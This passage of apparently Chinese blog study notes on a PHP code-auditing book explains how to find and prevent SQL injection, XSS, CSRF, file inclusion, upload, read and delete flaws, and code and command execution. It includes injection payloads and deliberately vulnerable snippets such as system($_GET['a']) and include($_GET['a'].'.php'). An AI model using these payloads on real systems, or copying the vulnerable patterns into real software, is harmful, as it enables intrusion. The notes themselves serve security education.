漏洞挖掘与防范(基础篇)"></a>第四章 漏洞挖掘与防范(基础篇)</h2><h3 id="4-1-SQL注入漏洞"><a href="#4-1-SQL注入漏洞" class="headerlink" title="4.1 SQL注入漏洞"></a>4.1 SQL注入漏洞</h3><p><strong>原理</strong>：由于开发者在编写操作数据库代码时，直接将外部可控参数拼接到SQL语句中，没有进行过滤，就直接放入数据库引擎执行。</p><p><strong>攻击方式</strong>：</p><ol><li>权限较大的情况下，可以直接写入webshell，或者直接执行系统命令</li><li>权限较小的情况下，可以获取管理员密码等信息，或者修改数据库内容进行钓鱼或其他简介利用</li></ol><h4 id="4-1-1-挖掘经验"><a href="#4-1-1-挖掘经验" class="headerlink" title="4.1.1 挖掘经验"></a>4.1.1 挖掘经验</h4><p>SQL注入经常出现在登录界面，获取HTTP头，订单处理等地方。登录界面的注入大多发生在HTTP头中的client-ip和x-forward-for，一般用来记录登录的IP地址。在订单系统中，由于订单涉及购物车等多个交互，经常发生二次注入。应当关注这些地方。</p><p>对于挖掘的注入类型有：</p><ol><li><p>普通注入。即int型或string型注入。是最容易利用的SQL注入漏洞。</p></li><li><p>编码注入。在SQL注入中常见的是MySQL宽字节以及urldecode/rawurldecode函数导致</p><ol><li><p>宽字节注入</p><p>当MySQL设置<code>set character_set_client=gbk</code>时会导致编码转化的注入问题，存在宽字节注入时，注入参数增加<code>%df%27</code>就会把程序中过滤的<code>\(%5c)</code>吃掉。</p><p>如：当对内容进行了过滤，提交?id=1’ and 1=1%23会变成select * from user where id=’1\‘ and 1=1#’显然这是没有注入成功的。但是提交?id=1%df’ and 1=1%23就会变成select * from user where id=’1*[^某个字]’ and 1=1 #’ 于是此时注入成功</p></li><li><p>二次urldecode注入</p><p>当目标程序使用了urldecode或者rawurldecode,开启了GPC。我们提交?id=%2527,在WebServer会自动解码一次变成id=1%27,最后经过程序里面的urldecode或者rawurldecode函数得到了id=1’从而引发了注入。（%25对应的是%）</p></li></ol></li></ol><h4 id="4-1-2-漏洞防范"><a href="#4-1-2-漏洞防范" class="headerlink" title="4.1.2 漏洞防范"></a>4.1.2 漏洞防范</h4><p>过滤类防范：</p><ol><li><p>gpc/rutime魔法引导（具体内容参考第一章内容）</p></li><li><p>addslashes函数</p><p>过滤范围为<code>&#39;</code>、<code>&quot;</code>、<code>\</code>以及空字符。</p></li><li><p>mysql_[real_]escape_string函数</p><p>mysql_escape_string和mysql_real_escape_string函数都是对字符串进行过滤，在PHP4.0.3以上版本才存在。以下字符受影响【\x00】【\n】【\r】【’】【”】【\xla】。两个函数的不同是在于mysql_real_escape_string接受的是一个连接句柄并根据当前字符集转义字符串</p></li><li><p>intval等字符转换</p><p>以上的方式在int类型注入时效果不好，可以通过报错或盲注进行绕过。此时intval等函数就起作用了，它的作用是将变量转换成int类型。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=intval(<span class="hljs-string">&quot;1 union select&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$id</span>;<br><span class="hljs-comment"># 输出为 1</span><br></code></pre></div></td></tr></table></figure></li></ol><p>PDO prepare 预编译</p><p>通过预编译的方式来处理数据库查询</p><p>案例：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">dbh=<span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&quot;mysql:host=127.0.0.1; dbname=demo&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;pass&quot;</span>);<br><span class="hljs-variable">$dbh</span>-&gt;exec(<span class="hljs-string">&quot;set name &#x27;gbk&#x27;&quot;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from test where name = ? and password = ?&quot;</span>;<br><span class="hljs-variable">$stmt</span>=<span class="hljs-variable">$dbh</span>-&gt;prepare(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$exeres</span>=<span class="hljs-variable">$stmt</span>-&gt;excute(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$name</span>,<span class="hljs-variable">$pass</span>));<br></code></pre></div></td></tr></table></figure><p>此处的代码显然使用了pdo的prepare方法来处理sql查询，但是在PHP版本&lt;5.3.6之前还是存在宽字节SQL注入漏洞，原因是这种方式是使用了PHP本地模拟prepare，再把完整的SQL语句发送给MySQL服务器</p><p>正确的也发应该是使用ATTR_EMULATE_PREPARES来禁用PHP本地模拟prepare</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">dbh=<span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&quot;mysql:host=127.0.0.1; dbname=demo&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;pass&quot;</span>);<br><span class="hljs-variable">$dbh</span>-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARE,<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$dbh</span>-&gt;exec(<span class="hljs-string">&quot;set name &#x27;utf-8&#x27;&quot;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from test where name = ? and password = ?&quot;</span>;<br><span class="hljs-variable">$stmt</span>=<span class="hljs-variable">$dbh</span>-&gt;prepare(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$exeres</span>=<span class="hljs-variable">$stmt</span>-&gt;excute(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$name</span>,<span class="hljs-variable">$pass</span>));<br></code></pre></div></td></tr></table></figure><h3 id="4-2-XSS漏洞"><a href="#4-2-XSS漏洞" class="headerlink" title="4.2 XSS漏洞"></a>4.2 XSS漏洞</h3><p>漏洞的危害是：前端页面能做的事它都能做。</p><h4 id="4-2-1-挖掘经验"><a href="#4-2-1-挖掘经验" class="headerlink" title="4.2.1 挖掘经验"></a>4.2.1 挖掘经验</h4><p>挖掘XSS漏洞的关键在于寻找没有被过滤的参数，常见的输出函数列表：</p><p>print,print_r,printf,sprintf,die,var_dump,var_export</p><p>XSS漏洞经常出现在文章的发表，评论回复、留言及资料设置等地方。</p><ol><li><p>反射型XSS</p><p>反射型XSS是直接通过外部输入然后再浏览器输出触发的类型。该类漏洞只需要将尖括号、单双引号等提交后，检查返回的HTML界面有没有保留原来的特殊字符即可判断。</p></li><li><p>存储型XSS</p><p>挖掘存储型XSS也是需要寻找未过滤的输入点和未过滤的输出函数。</p><p>案例是：骑士CMS存储型XSS</p></li></ol><h4 id="4-2-2-漏洞防范"><a href="#4-2-2-漏洞防范" class="headerlink" title="4.2.2 漏洞防范"></a>4.2.2 漏洞防范</h4><ol><li><p>特殊字符HTML实体转码</p><p>一般的XSS漏洞都是因为没有过滤特殊字符，导致使用引号，尖括号等就可以被利用。</p><p>防范这类的XSS漏洞过滤相关的特殊符号即可</p><p><code>&#39;</code>,<code>&quot;</code>,<code>&lt;&gt;</code>,<code>\</code>,<code>:</code>,<code>&amp;</code>,<code>#</code></p><p>最好在调用输出时进行HTML实体转码</p></li><li><p>标签事件属性黑白名单</p></li></ol><h3 id="4-3-CSRF漏洞"><a href="#4-3-CSRF漏洞" class="headerlink" title="4.3 CSRF漏洞"></a>4.3 CSRF漏洞</h3><p>CSRF全称为Cross-site request forgery,跨站请求伪造。是劫持其他用户去进行一些请求</p><h4 id="4-3-1-挖掘经验"><a href="#4-3-1-挖掘经验" class="headerlink" title="4.3.1 挖掘经验"></a>4.3.1 挖掘经验</h4><p>主要用于越权操作。在查找时可以先打开几个非静态界面，抓包查看有没有token，如果没有，再请求该界面，且不带referer。如果返回的数据还是一样，那就说明很有可能有CSRF漏洞。</p><p>从白盒角度来说，只需要查看核心文件里面有没有验证token和referer相关的代码，如果没有，就去查看较为重要的功能点有没有验证。</p><p>案例：Discuz CSRF备份拖库分析</p><h4 id="4-3-2-漏洞防范"><a href="#4-3-2-漏洞防范" class="headerlink" title="4.3.2 漏洞防范"></a>4.3.2 漏洞防范</h4><p>防御该类漏洞主要是解决可信问题。所以重要有两点</p><ol><li><p>增加token/referer验证img标签请求的水抗攻击</p><p>token简单来说就是再用户访问的界面添加不可预测的字符串，在用户请求时验证该token是否正确</p></li><li><p>增加验证码</p><p>考虑用户体验，只建议在敏感操作的界面进行</p></li></ol><h2 id="第五章-漏洞挖掘与防范-进阶篇"><a href="#第五章-漏洞挖掘与防范-进阶篇" class="headerlink" title="第五章 漏洞挖掘与防范(进阶篇)"></a>第五章 漏洞挖掘与防范(进阶篇)</h2><h3 id="5-1-文件操作漏洞"><a href="#5-1-文件操作漏洞" class="headerlink" title="5.1 文件操作漏洞"></a>5.1 文件操作漏洞</h3><p>文件操作包括文件包含，文件读取，文件删除，文件修改以及文件上传。这些方式都有类似的漏洞</p><h4 id="5-1-1-文件包含漏洞"><a href="#5-1-1-文件包含漏洞" class="headerlink" title="5.1.1 文件包含漏洞"></a>5.1.1 文件包含漏洞</h4><p>文件包含包括本地文件包含和远程文件包含。</p><p>常用的相关函数是include(),include_once(),require()和require_once()，它们之间的区别是include是在包含文件时遇到错误下面的代码也会执行，而require()这回直接报错退出程序</p><ol><li><p>挖掘经验 </p><p>文件包含漏洞通常出现在模块加载，模板加载以及cache调用的地方。比如存入的模块名参数。</p><p>所以在挖掘相关漏洞时可以先跟踪一些程序的运行流程，查看模块加载时包含的文件是否可控。也可以直接搜索相关的函数，进行回溯。</p><p>一般这类都是本地文件包含，大多需要截断</p><ol><li><p>本地文件包含</p><p>重要用于包含允许上传的格式的文件来执行代码，包含PHP上传的临时文件</p></li><li><p>远程文件包含</p><p>需要allow_url_include=On</p></li><li><p>文件包含截断</p><p>一般来说文件包含都是固定了后缀(前缀)所以经常需要截断</p><ol><li><p>使用%00进行截断</p><p>开启GPC和&gt;PHP5.3均不可用了</p></li><li><p>利用多个<code>.</code>和<code>\</code></p><p>该方法不受限于GPC但是同样在PHP5.3之后被修复，且需要的数量较多</p></li><li><p>远程文件包含时利用问号(?)来伪截断</p><p>在HTTP协议中访问<a href="http://example/1.txt%E5%92%8C%E8%AE%BF%E9%97%AEhttp://example/1.txt?.php%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84%E8%BF%94%E5%9B%9E%E3%80%82%E5%9B%A0%E4%B8%BA%E6%AD%A4%E6%97%B6WebServer%E6%8A%8A?%E4%B9%8B%E5%90%8E%E7%9A%84%E5%86%85%E5%AE%B9%E5%BD%93%E6%88%90%E6%98%AF%E8%AF%B7%E6%B1%82%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8Ctxt%E4%B8%8D%E5%9C%A8WebServer%E9%87%8C%E9%9D%A2%E8%A7%A3%E6%9E%90%E3%80%82%E6%89%80%E4%BB%A5%E5%AE%9E%E7%8E%B0%E4%BA%86%E4%BC%AA%E6%88%AA%E6%96%AD">http://example/1.txt和访问http://example/1.txt?.php是相同的返回。因为此时WebServer把?之后的内容当成是请求的参数而txt不在WebServer里面解析。所以实现了伪截断</a></p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>请求/1.php?a=<a href="http://example/2.txt?2.txt%E4%BC%9A%E6%89%A7%E8%A1%8C%E5%AF%B9%E5%BA%94%E4%BB%A3%E7%A0%81">http://example/2.txt?2.txt会执行对应代码</a></p></li></ol></li></ol></li></ol><h4 id="5-1-2-文件读取-下载-漏洞"><a href="#5-1-2-文件读取-下载-漏洞" class="headerlink" title="5.1.2 文件读取(下载)漏洞"></a>5.1.2 文件读取(下载)漏洞</h4><p>部分程序在下载文件或读取显示文件时，读取文件的参数直接在请求中传递，后台程序获取到这个文件路径之后直接读取返回。而该参数一般都是可控的，所以造成漏洞利用。</p><ol><li><p>挖掘经验</p><p>可以先在黑盒情况下，去查看功能点对应的文件，再去读文件。另外是直接搜索相关的文件读取函数，再回溯查看能否控制参数</p><p>相关的函数列表：file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgets(),parse_ini_file(),show_source(),file()。除了这些函数还有一些其他功能函数一样可以用来读取文件，比如include，和PHP输入输出流php://filter/来读取问文件</p></li></ol><h4 id="5-1-3-文件上传漏洞"><a href="#5-1-3-文件上传漏洞" class="headerlink" title="5.1.3 文件上传漏洞"></a>5.1.3 文件上传漏洞</h4><ol><li><p>挖掘经验 </p><p>上传的点基本都是调用一个上传类，上传的函数只有move_uploaded_file()，所以直接搜索该函数。再查看上传文件的代码是否存在限制上传格式和可否绕过。再看是否有改名的情况，如果不改名，还可以利用Apache向前寻找解析和IIS6的分号解析bug来执行代码</p></li></ol><p><strong>过滤类型</strong></p><ol><li><p>未过滤或本地过滤</p><p>共同点是在服务端没有进行过滤，此时可以抓包直接上传。</p></li><li><p>黑名单拓展名过滤</p><p>绕过方法主要是利用限制的扩展名不全，</p><p>还可以通过在后面添加空格的方法和截断</p></li><li><p>文件头，content-type验证</p><p>该方法极其容易绕过</p></li></ol><h4 id="5-1-4-文件删除漏洞"><a href="#5-1-4-文件删除漏洞" class="headerlink" title="5.1.4 文件删除漏洞"></a>5.1.4 文件删除漏洞</h4><p>该漏洞与文件读取漏洞显示，多是由于可以使用../跳转</p><ol><li><p>挖掘经验 </p><p>想到对应的功能点尝试使用../去绕过删除，如果不行再根据删除的函数unlik()和老版本的session_destroy()函数去搜索查看代码</p></li></ol><h4 id="5-1-5-文件操作漏洞防范"><a href="#5-1-5-文件操作漏洞防范" class="headerlink" title="5.1.5 文件操作漏洞防范"></a>5.1.5 文件操作漏洞防范</h4><p>文件操作漏洞的共同点和解决方法是:</p><ol><li><p>由越权操作引起可以操作未授权操作的文件</p><p>对权限合理的管理,如a用户上传的文件，其他平行用户不能再未获取授权的情况下进行操作，并且特殊的文件只能特定用户操作</p></li><li><p>要操作更多的文件需要跳转目录</p><p>将用户的信息与文件绑定，只有确认之后才能操作</p></li><li><p>大多都是直接在请求中传入文件名</p><p>禁止参数中有<code>..</code>和<code>\</code>,<code>/</code>来跳转目录，检查时遇到相关的字符停止程序</p></li></ol><p>文件上传漏洞主要有两种利用方式</p><ol><li>上传的文件类型验证不严谨</li><li>写入文件不规范</li></ol><p>防范方案如下:</p><ol><li>白名单方式过滤文件扩展名，使用in_array或三等于(===)来对比扩展名</li><li>保存上传的文件时重命名文件，文件名命名规则采用时间戳的拼接随机数的MD5方式”md5(time()+rand(1,10000))”</li></ol><h3 id="5-2-代码执行漏洞"><a href="#5-2-代码执行漏洞" class="headerlink" title="5.2 代码执行漏洞"></a>5.2 代码执行漏洞</h3><p>代码执行漏洞是指：应用程序本身过滤不严，用户可以通过请求将代码注入到应用执行。</p><p>相关的函数列表有：eval(),assert(),preg_replace(),call_user_func(),call_user_func_array(),array_map()等</p><p>此外PHP的动态函数($a($b))也是出现比较多</p><h4 id="5-2-1-挖掘经验"><a href="#5-2-1-挖掘经验" class="headerlink" title="5.2.1 挖掘经验"></a>5.2.1 挖掘经验</h4><ol><li><p>eval(),assert()</p><p>作用：函数能够直接执行php代码</p><p>载入缓存，模板以及对变量过滤不严格后的代码执行。</p></li><li><p>preg_replace()</p><p>作用：是对字符串进行正则处理</p><p>代码执行需要存在/e参数，多出现在对字符的的处理，如URL，HTML，文章内容等过滤</p><p>例：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">preg_replace(<span class="hljs-string">&quot;/\[(.*)\]/e&quot;</span>,<span class="hljs-string">&quot;\\1&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p>正则的意思是将获取的变量里搜索中括号[]中间的内容作为第一组结果。</p><p>preg_replace()函数第二个函数为’\\1’代表这里用第一组结果填充。所以请求?str=[phpinfo()]时可以显示该代码</p></li><li><p>调用函数过滤不严</p><p>call_user_func(),array_map()等函数有调用其他函数的功能，其中的一个参数作为要调用的函数名，那如果这个传入函数名可控，那就可以调用意外的函数来执行代码</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;phpinfo()&quot;</span>;<br>call_user_func(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$b</span>);<br></code></pre></div></td></tr></table></figure><p>请求?a=assert时，调用了对应的函数</p></li><li><p>动态函数执行</p><p>  由于PHP的特性原因，PHP的函数可以直接有字符串拼接。所以很多程序使用了动态函数的写法，但是一旦过滤不严格就会造成代码执行漏洞</p><p>  例子：</p>  <figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p>  代码意思是接受GET请求的a参数，作为函数，b参数作为函数的参数。</p><p>  请求为url：?a=assert&amp;b=phpinfo()，成功显示PHPINFO界面</p></li></ol><h4 id="5-2-2-漏洞防范"><a href="#5-2-2-漏洞防范" class="headerlink" title="5.2.2 漏洞防范"></a>5.2.2 漏洞防范</h4><p>采用白名单过滤，在预测满足正常业务的参数情况下，是非常实用的防范。</p><h3 id="5-3-命令执行漏洞"><a href="#5-3-命令执行漏洞" class="headerlink" title="5.3 命令执行漏洞"></a>5.3 命令执行漏洞</h3><p>代码执行漏洞指可执行的PHP代码脚本，而命令执行漏洞是指可执行系统或者应用程序的漏洞。</p><p>PHP命令执行漏洞主要是一些函数的参数过滤不严谨，可执行的函数有system(),exec(),shell_exec(),passthru(),pcntl_exec(),popen(),proc_open()共七个函数，另外(`)也可以执行命令,不过该方法实际上是调用shell_exec()函数。</p><p>PHP代码执行是继承的WebServer用户的权限。</p><h4 id="5-3-1-挖掘经验"><a href="#5-3-1-挖掘经验" class="headerlink" title="5.3.1 挖掘经验"></a>5.3.1 挖掘经验</h4><p>命令执行漏洞最多出现在包含环境包的应用中，在该类应用中直接搜索相关函数。另外在调用外部程序的地方也会出现命令执行漏洞。</p><p>具体执行方式：</p><ol><li><p>system(),exec(),shell_exec(),passthru()以及反引号`可以直接传入命令并直接返回结果不需要echo打印。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p>测试结果如图：</p><p><img src="https://pic.imgdb.cn/item/60ee3add5132923bf8af6b2b.png"></p></li><li><p>pcntl是PHP的多线程处理扩展，在处理大量任务时会使用到。</p><p>函数说明：void pcntl_exec(string $path [, array $args [, array $envs]])</p><p>其中$path为可执行程序的路径，$args表示传递给$path程序的参数，$envs表示执行该程序的环境变量。</p></li><li><p>popen()、proc_open()函数不会返回执行结果，只是返回文件指针，但是命令已经执行了。</p><p>这里举例popen() 函数需要两个参数，一个执行命令，一个是指针文件的连接模式，有r和w两种模式</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">popen(<span class="hljs-string">&quot;whoami &gt;&gt; D:/2.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>此时在D:/2.txt中就记录了对应命令的输出</p></li><li><p>反引号命令执行</p><p>代码实质是调用shell_exec()，参考代码如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> `whoami`;<br></code></pre></div></td></tr></table></figure></li></ol><h4 id="5-3-2-漏洞防范"><a href="#5-3-2-漏洞防范" class="headerlink" title="5.3.2 漏洞防范"></a>5.3.2 漏洞防范</h4><p>关于命令执行漏洞防范大致有两种方法：</p><ol><li><p>使用PHP自带的命令防注入函数，如escapeshellcmd()和escapeshellarg()。其中escapeshellcmd()是过滤整条命令，参数也是整条命令，而escapeshellarg()则是用来保证传入命令执行的参数是以字符串参数形式存在。</p><ol><li><p>escapeshellcmd()</p><p>输入一个string类型的参数，即要过滤的命令，返回过滤后的string类型命令。过滤的字符为<code>&amp;</code>,<code>;</code>,<code>(`)</code>,<code>|</code>,<code>*</code>,<code>?</code>,<code>~</code>,<code>&lt;&gt;</code>,<code>^</code>,<code>()</code>,<code>[]</code>,<code>&#123;&#125;</code>,<code>$</code>,<code>\</code>,<code>\x0A</code>,<code>\xFF</code>,<code>%</code>而<code>&#39;</code>,<code>&quot;</code>仅在不对称的时候被转移</p><p>参考如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span>(escapeshellcmd(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]));<br></code></pre></div></td></tr></table></figure><p>结果如图：</p><p><img src="https://pic.imgdb.cn/item/60ee41545132923bf8dab4c2.png"></p><p>过滤方法是在Windows情况下在对应字符前添加<code>^</code>，而在linux下是在字符前添加<code>\</code></p></li><li><p>escapeshellarg()</p><p>函数的功能是过滤参数，将参数限制在一对双引号中，确保参数为一个字符串。隐藏它会把双引号替换为空格</p><p>测试如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> (escapeshellarg(<span class="hljs-string">&#x27;ls a&quot;&#x27;</span>));<br><span class="hljs-comment"># 输出为 &quot;ls a &quot;</span><br></code></pre></div></td></tr></table></figure></li></ol></li><li><p>白名单限制</p><p>在代码或配置文件中限制某些参数。在使用时参数不在白名单时，不予执行即可</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>书籍 代码审计：企业级Web代码安全架构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计-代码审计前的准备</title>
    <link href="/2021/07/12/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87/"/>
    <url>/2021/07/12/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87/</url>
    
    <content type="html"><![CDATA[<h1 id="代码审计前的准备"><a href="#代码审计前的准备" class="headerlink" title="代码审计前的准备"></a>代码审计前的准备</h1><h2 id="第一章-代码审计环境搭建"><a href="#第一章-代码审计环境搭建" class="headerlink" title="第一章 代码审计环境搭建"></a>第一章 代码审计环境搭建</h2><h3 id="1-1-1-2-wamp-lamp-搭建"><a href="#1-1-1-2-wamp-lamp-搭建" class="headerlink" title="1.1-1.2 wamp\lamp 搭建"></a>1.1-1.2 wamp\lamp 搭建</h3><p>建议 wamp\lamp搭建全部使用集成环境<a href="https://www.xp.cn/">phpStudy</a>进行安装</p><h3 id="1-3-php核心配置详解"><a href="#1-3-php核心配置详解" class="headerlink" title="1.3 php核心配置详解"></a>1.3 php核心配置详解</h3><ol><li><p><strong>PHP_INI_* 常量的定义</strong></p><table><thead><tr><th>常量</th><th>含义</th></tr></thead><tbody><tr><td>PHP_INI_USER</td><td>该配置选项可在用户的PHP脚本或Windows注册表中设置</td></tr><tr><td>PHP_INI_PERDIR</td><td>该配置选项可在php.ini. .htaccess或httpd.conf中设置</td></tr><tr><td>PHP_INI_SYSTEM</td><td>该配置选项可在php.ini或httpd.conf中设置</td></tr><tr><td>PHP_INI_ALL</td><td>该配置选项可在任何地方设置</td></tr><tr><td>php.ini only</td><td>该配置选项可仅可在php.ini中配置</td></tr></tbody></table></li><li><p>影响PHP脚本安全的配置和选项</p><ol><li><p>register_globals(全局变量注册开关)</p><p>当设置为on时，会将用户使用GET，POST等方式提交的参数注册成全局变量并初始化值为参数对应的值。导致提交的参数可以直接在脚本中使用。</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;success&#x27;</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>提交url为：<a href="http://host:port/test.php?user=admin">http://host:port/test.php?user=admin</a></p><p>版本低于5.4.0且设置为on时，会输出success</p><p><strong>版本</strong>：PHP&lt;5.4.0。5.3.0起被废除，不推荐使用，5.4.0移除该选项</p></li><li><p>allow_url_include(是否允许包含远程文件)</p><p>设置为on时，可以直接包含远程文件，在include($var)中若$var可控，可以执行PHP代码。</p><p>类似配置有allow_url_fopen</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p>此时可以直接远程执行代码</p><p><strong>版本</strong>：在PHP5.2.0之后默认设置为off</p></li><li><p>magic_quotes_gpc(魔法引号自动过滤)</p><p>被开启之后，在不存在编码或者其他特殊绕过的情况下，可以使得很多漏洞无法被利用。</p><p>在选项设置为on时，会自动在GET、POST、COOKIE变量中的<code>&#39;</code>,<code>&quot;</code>,<code>\</code>,<code>null</code>的前面加上反斜杠<code>\</code>,在PHP5中不会过滤$_SERVER变量</p><p><strong>版本</strong>：PHP&lt;4.2.3时，配置范围是PHP_INI_ALL,PHP&lt;5.3配置范围是PHP_INI_PERDIR,PHP&gt;=5.4之后被废除。</p></li><li><p>magic_quotes_runtime(魔术引号自动过滤)</p><p>具体作用与gpc相同，区别是，magic_quotes_runtime只对从数据库或者文件中获取的数据进行过滤。</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">ini_set(<span class="hljs-string">&quot;magic_quotes_runtime&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>);<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;1.txt&quot;</span>);<br></code></pre></div></td></tr></table></figure><p><strong>版本</strong>：PHP5.4&gt;=被废除，配置范围是PHP_INI_ALL</p></li><li><p>magic_quotes_sybase(魔术引号自动过滤)</p><p>当设置为on时，会覆盖gpc的配置，但是仅仅转义了空字符和把单引号变成了双引号。</p><p><strong>版本</strong>：PHP5.4&gt;=被废除，配置范围是PHP_INI_ALL</p></li><li><p>safe_mode(安全模式)</p><p>设置为on时，会出现下面限制</p><ol><li><p>所有文件操作函数会受到限制，可以使用safe_mode_include_dir指令来配置可以包含的路径</p></li><li><p>函数指令命令或程序会提示错误。可以将这些脚本集中放置一个目录，然后使用safe_mode_exec_dir指令指向脚本的目录</p></li><li><p>受影响的函数列表：</p><table><thead><tr><th>函数名</th><th>限制</th></tr></thead><tbody><tr><td>dbmopen()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>dbase_open()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 